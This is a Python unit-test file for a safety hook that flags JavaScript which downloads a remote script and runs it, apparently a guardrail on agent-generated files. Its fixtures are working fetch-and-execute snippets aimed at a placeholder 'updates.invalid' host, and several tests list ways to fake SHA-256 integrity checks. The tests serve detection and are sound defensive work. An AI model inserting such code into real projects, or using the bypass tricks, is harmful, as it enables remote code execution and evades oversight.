import json
import os
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path


BUNDLE = Path(__file__).resolve().parents[1]
SCRIPTS = BUNDLE / "hooks/scripts"
MATCHER = SCRIPTS / "matcher_bash.py"
sys.path.insert(0, str(SCRIPTS))

from javascript_dependencies import javascript_dynamic_effect_risk


PIPE_EXEC = """const fs = require('fs');
const https = require('https');
const { execSync } = require('child_process');
const file = fs.createWriteStream('setup.sh');
https.get('https://updates.invalid/setup.sh', (res) => {
  res.pipe(file);
  file.on('finish', () => { file.close(); execSync('bash setup.sh'); });
});
"""

ASYNC_EXEC = """const https = require('https');
const fs = require('fs');
const { spawn } = require('child_process');
const tempScript = 'install.tmp';
function download(url) {
  return new Promise((resolve) => {
    let data = '';
    https.get(url, (res) => {
      res.on('data', (chunk) => { data += chunk; });
      res.on('end', () => { resolve(data); });
    });
  });
}
function execute(scriptContent) {
  fs.writeFileSync(tempScript, scriptContent);
  return spawn('sh', [tempScript]);
}
async function main() {
  const scriptContent = await download('https://updates.invalid/setup.sh');
  await execute(scriptContent);
}
main();
"""


class JavascriptRemoteExecutionTests(unittest.TestCase):
    def test_reachable_stream_and_async_remote_execution_are_detected(self):
        self.assertIn("streams a remote response", javascript_dynamic_effect_risk(PIPE_EXEC))
        self.assertIn("remote response data", javascript_dynamic_effect_risk(ASYNC_EXEC))

    def test_download_without_execution_is_allowed(self):
        source = PIPE_EXEC.replace("const { execSync } = require('child_process');", "")
        source = source.replace("execSync('bash setup.sh');", "console.log('downloaded');")
        self.assertEqual(javascript_dynamic_effect_risk(source), "")

    def test_unrelated_local_execution_is_not_remote_payload_lineage(self):
        source = """const https=require('https');
const {execSync}=require('child_process');
https.get('https://data.invalid/report.json', res => res.resume());
execSync('bash local-reviewed-script.sh');
"""
        self.assertEqual(javascript_dynamic_effect_risk(source), "")

    def test_uninvoked_function_is_not_reachable(self):
        source = "function dormant() {\n" + PIPE_EXEC + "\n}\nconsole.log('safe');\n"
        self.assertEqual(javascript_dynamic_effect_risk(source), "")

    def test_literal_false_branch_is_not_reachable(self):
        source = "if (false) {\n" + PIPE_EXEC + "\n}\nconsole.log('safe');\n"
        self.assertEqual(javascript_dynamic_effect_risk(source), "")

    def test_pinned_sha256_guard_allows_async_execution(self):
        expected = "a" * 64
        checked = ASYNC_EXEC.replace(
            "const fs = require('fs');",
            "const fs = require('fs');\nconst crypto = require('crypto');\n"
            f"const EXPECTED = '{expected}';",
        ).replace(
            "  await execute(scriptContent);",
            "  const digest = crypto.createHash('sha256').update(scriptContent).digest('hex');\n"
            "  if (digest !== EXPECTED) throw new Error('integrity mismatch');\n"
            "  await execute(scriptContent);",
        )
        self.assertEqual(javascript_dynamic_effect_risk(checked), "")

    def test_other_download_guard_does_not_authorize_main_payload(self):
        expected = "a" * 64
        source = ASYNC_EXEC.replace(
            "async function main() {",
            "async function checkedOther() {\n"
            "  const scriptContent = await download('https://updates.invalid/other.sh');\n"
            "  const digest = crypto.createHash('sha256').update(scriptContent).digest('hex');\n"
            "  if (digest !== EXPECTED) throw new Error('integrity mismatch');\n"
            "}\n"
            "checkedOther();\n"
            "async function main() {",
        ).replace(
            "const fs = require('fs');",
            "const fs = require('fs');\nconst crypto = require('crypto');\n"
            f"const EXPECTED = '{expected}';",
        )
        self.assertIn("without a pinned integrity check", javascript_dynamic_effect_risk(source))

    def test_guard_helper_called_after_execution_does_not_apply_retroactively(self):
        expected = "a" * 64
        source = ASYNC_EXEC.replace(
            "const fs = require('fs');",
            "const fs = require('fs');\nconst crypto = require('crypto');\n"
            f"const EXPECTED = '{expected}';\n"
            "function checkLater(scriptContent) {\n"
            "  const digest = crypto.createHash('sha256').update(scriptContent).digest('hex');\n"
            "  if (digest !== EXPECTED) throw new Error('integrity mismatch');\n"
            "}",
        ).replace(
            "  await execute(scriptContent);",
            "  await execute(scriptContent);\n  checkLater(scriptContent);",
        )
        self.assertIn("without a pinned integrity check", javascript_dynamic_effect_risk(source))

    def test_conditional_guard_does_not_prove_every_execution_is_checked(self):
        expected = "a" * 64
        source = ASYNC_EXEC.replace(
            "const fs = require('fs');",
            "const fs = require('fs');\nconst crypto = require('crypto');\n"
            f"const EXPECTED = '{expected}';",
        ).replace(
            "  await execute(scriptContent);",
            "  if (process.env.CHECK_DOWNLOAD) {\n"
            "    const digest = crypto.createHash('sha256').update(scriptContent).digest('hex');\n"
            "    if (digest !== EXPECTED) throw new Error('integrity mismatch');\n"
            "  }\n"
            "  await execute(scriptContent);",
        )
        self.assertIn("without a pinned integrity check", javascript_dynamic_effect_risk(source))

    def test_fake_hash_function_does_not_count_as_crypto_integrity(self):
        expected = "a" * 64
        source = ASYNC_EXEC.replace(
            "const fs = require('fs');",
            "const fs = require('fs');\n"
            f"const EXPECTED = '{expected}';\n"
            "function createHash() { return { update() { return this; }, digest() { return EXPECTED; } }; }",
        ).replace(
            "  await execute(scriptContent);",
            "  const digest = createHash('sha256').update(scriptContent).digest('hex');\n"
            "  if (digest !== EXPECTED) throw new Error('integrity mismatch');\n"
            "  await execute(scriptContent);",
        )
        self.assertIn("without a pinned integrity check", javascript_dynamic_effect_risk(source))

    def test_crypto_namespace_override_does_not_count_as_integrity(self):
        expected = "a" * 64
        source = ASYNC_EXEC.replace(
            "const fs = require('fs');",
            "const fs = require('fs');\nconst crypto = require('crypto');\n"
            f"const EXPECTED = '{expected}';",
        ).replace(
            "  await execute(scriptContent);",
            "  crypto.createHash = () => ({ update: () => ({ digest: () => EXPECTED }) });\n"
            "  const digest = crypto.createHash('sha256').update(scriptContent).digest('hex');\n"
            "  if (digest !== EXPECTED) throw new Error('integrity mismatch');\n"
            "  await execute(scriptContent);",
        )
        self.assertIn("without a pinned integrity check", javascript_dynamic_effect_risk(source))

    def test_crypto_namespace_alias_or_reflection_invalidates_proof(self):
        expected = "a" * 64
        for mutation in (
            "Object.assign(crypto, { createHash: fakeHash });",
            "const mutableCrypto = crypto; mutableCrypto.createHash = fakeHash;",
        ):
            with self.subTest(mutation=mutation):
                candidate = ASYNC_EXEC.replace(
                    "const fs = require('fs');",
                    "const fs = require('fs');\nconst crypto = require('crypto');\n"
                    f"const EXPECTED = '{expected}';\n"
                    "const fakeHash = () => ({ update: () => ({ digest: () => EXPECTED }) });",
                ).replace(
                    "  await execute(scriptContent);",
                    f"  {mutation}\n"
                    "  const digest = crypto.createHash('sha256').update(scriptContent).digest('hex');\n"
                    "  if (digest !== EXPECTED) throw new Error('integrity mismatch');\n"
                    "  await execute(scriptContent);",
                )
                self.assertIn(
                    "without a pinned integrity check",
                    javascript_dynamic_effect_risk(candidate),
                )

    def test_crypto_parameter_shadow_does_not_borrow_global_import(self):
        expected = "a" * 64
        source = ASYNC_EXEC.replace(
            "const fs = require('fs');",
            "const fs = require('fs');\nconst crypto = require('crypto');\n"
            f"const EXPECTED = '{expected}';",
        ).replace(
            "async function main() {",
            "async function main(crypto) {",
        ).replace(
            "  await execute(scriptContent);",
            "  const digest = crypto.createHash('sha256').update(scriptContent).digest('hex');\n"
            "  if (digest !== EXPECTED) throw new Error('integrity mismatch');\n"
            "  await execute(scriptContent);",
        ).replace(
            "main();",
            "main({ createHash: () => ({ update: () => ({ digest: () => EXPECTED }) }) });",
        )
        self.assertIn("without a pinned integrity check", javascript_dynamic_effect_risk(source))

    def test_payload_reassignment_after_guard_invalidates_check(self):
        expected = "a" * 64
        source = ASYNC_EXEC.replace(
            "const fs = require('fs');",
            "const fs = require('fs');\nconst crypto = require('crypto');\n"
            f"const EXPECTED = '{expected}';",
        ).replace(
            "  const scriptContent = await download",
            "  let scriptContent = await download",
        ).replace(
            "  await execute(scriptContent);",
            "  const digest = crypto.createHash('sha256').update(scriptContent).digest('hex');\n"
            "  if (digest !== EXPECTED) throw new Error('integrity mismatch');\n"
            "  scriptContent += 'tampered';\n"
            "  await execute(scriptContent);",
        )
        self.assertIn("without a pinned integrity check", javascript_dynamic_effect_risk(source))

    def test_conditional_payload_mutation_after_guard_invalidates_check(self):
        expected = "a" * 64
        source = ASYNC_EXEC.replace(
            "const fs = require('fs');",
            "const fs = require('fs');\nconst crypto = require('crypto');\n"
            f"const EXPECTED = '{expected}';",
        ).replace(
            "  const scriptContent = await download",
            "  let scriptContent = await download",
        ).replace(
            "  await execute(scriptContent);",
            "  const digest = crypto.createHash('sha256').update(scriptContent).digest('hex');\n"
            "  if (digest !== EXPECTED) throw new Error('integrity mismatch');\n"
            "  if (process.env.REWRITE) { scriptContent = 'replacement'; }\n"
            "  await execute(scriptContent);",
        )
        self.assertIn("without a pinned integrity check", javascript_dynamic_effect_risk(source))

    def test_execution_before_later_guard_remains_blocked(self):
        expected = "a" * 64
        source = ASYNC_EXEC.replace(
            "const fs = require('fs');",
            "const fs = require('fs');\nconst crypto = require('crypto');\n"
            f"const EXPECTED = '{expected}';",
        ).replace(
            "  await execute(scriptContent);",
            "  await execute(scriptContent);\n"
            "  const digest = crypto.createHash('sha256').update(scriptContent).digest('hex');\n"
            "  if (digest !== EXPECTED) throw new Error('integrity mismatch');",
        )
        self.assertIn("without a pinned integrity check", javascript_dynamic_effect_risk(source))

    def test_checksum_words_without_a_concrete_guard_do_not_bypass(self):
        source = ASYNC_EXEC.replace(
            "  await execute(scriptContent);",
            "  console.log('checksum verified');\n  await execute(scriptContent);",
        )
        self.assertIn("without a pinned integrity check", javascript_dynamic_effect_risk(source))


class GeneratedJavascriptMatcherTests(unittest.TestCase):
    def run_matcher(self, path: str, source: str) -> subprocess.CompletedProcess[str]:
        state = Path(tempfile.mkdtemp(prefix="generated-js-remote-exec-test-"))
        snapshot = state / "snapshot.json"
        snapshot.write_text(json.dumps({
            "authoritative": True, "snapshot_status": "ready",
            "cwd": "/workspace", "file_contents": {}, "excluded_files": {},
        }), encoding="utf-8")
        environment = dict(
            os.environ,
            SAFETY_ORCH_STATUS_DIR=str(state),
            SAFETY_ORCH_WORKSPACE_SNAPSHOT=str(snapshot),
        )
        command = "cat > " + path + " << 'EOF'\n" + source + "EOF"
        return subprocess.run(
            [sys.executable, str(MATCHER)],
            input=json.dumps({"cwd": "/workspace", "tool_input": {"command": command}}),
            text=True, capture_output=True, env=environment, check=False,
        )

    def test_generated_reachable_remote_executor_is_blocked(self):
        for path, source in (("setup.js", PIPE_EXEC), ("scripts/install.js", ASYNC_EXEC)):
            with self.subTest(path=path):
                result = self.run_matcher(path, source)
                self.assertEqual(result.returncode, 2, result.stdout + result.stderr)
                self.assertIn("Generated JavaScript controller", result.stdout + result.stderr)

    def test_generated_safe_controls_are_allowed(self):
        safe = PIPE_EXEC.replace("const { execSync } = require('child_process');", "")
        safe = safe.replace("execSync('bash setup.sh');", "console.log('downloaded');")
        result = self.run_matcher("scripts/download.js", safe)
        self.assertEqual(result.returncode, 0, result.stdout + result.stderr)


if __name__ == "__main__":
    unittest.main()
